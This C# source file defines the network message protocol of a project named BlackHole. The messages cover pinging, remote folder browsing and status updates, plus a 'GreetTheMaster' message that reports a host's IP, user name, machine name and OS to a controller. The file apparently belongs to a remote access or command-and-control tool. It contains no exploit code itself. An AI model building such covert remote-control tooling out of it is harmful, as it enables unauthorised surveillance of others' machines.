using ProtoBuf;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Common.Network.Protocol
{

    // ===========================================
    // ================= Messages ================
    // ===========================================

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class StatusUpdateMessage : NetMessage
    {
        public string Operation { get; set; }
        public bool Success { get; set; }
        public string Message { get; set; }
    }
    
    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class FolderNavigationMessage : NetMessage
    {
        public string Path { get; set; }
        public List<FileMeta> Files { get; set; }
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class NavigateToFolderMessage : NetMessage
    {
        public string Path { get; set; }
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class PongMessage : NetMessage
    {
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class PingMessage : NetMessage
    {
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class GreetTheMasterMessage : NetMessage
    {
        public string Ip { get; set; }
        public string UserName { get; set; }
        public string MachineName { get; set; }
        public string OperatingSystem { get; set; }
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class DoYourDutyMessage : NetMessage
    {
    }

    // ====================================
    // ================= Data =============
    // ====================================

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public enum FileType
    {
        [ProtoEnum]
        FOLDER,
        [ProtoEnum]
        FILE
    }

    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public sealed class FileMeta
    {
        public FileType Type { get; set; }
        public string Name { get; set; }
        public string Size { get; set; }
    }

    [ProtoInclude(1006, typeof(StatusUpdateMessage))]
    [ProtoInclude(1005, typeof(FolderNavigationMessage))]
    [ProtoInclude(1004, typeof(NavigateToFolderMessage))]
    [ProtoInclude(1003, typeof(PongMessage))]
    [ProtoInclude(1002, typeof(PingMessage))]
    [ProtoInclude(1001, typeof(DoYourDutyMessage))]
    [ProtoInclude(1000, typeof(GreetTheMasterMessage))]
    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
    public abstract class NetMessage
    {
        /// <summary>
        /// Cache buffer
        /// </summary>
        private byte[] m_serializedBuffer;

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public byte[] Serialize()
        {
            if (m_serializedBuffer == null)
            {
                using (var stream = new MemoryStream())
                {
                    using (var lzStream = new Lz4Net.Lz4CompressionStream(stream, Lz4Net.Lz4Mode.Fast))
                        Serializer.Serialize(lzStream, this);
                    m_serializedBuffer = stream.ToArray();
                }
            }
            return m_serializedBuffer;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        public static NetMessage Deserialize(byte[] data)
        {
            using (var stream = new Lz4Net.Lz4DecompressionStream(new MemoryStream(data)))            
                return Serializer.Deserialize<NetMessage>(stream);            
        }
    }
}
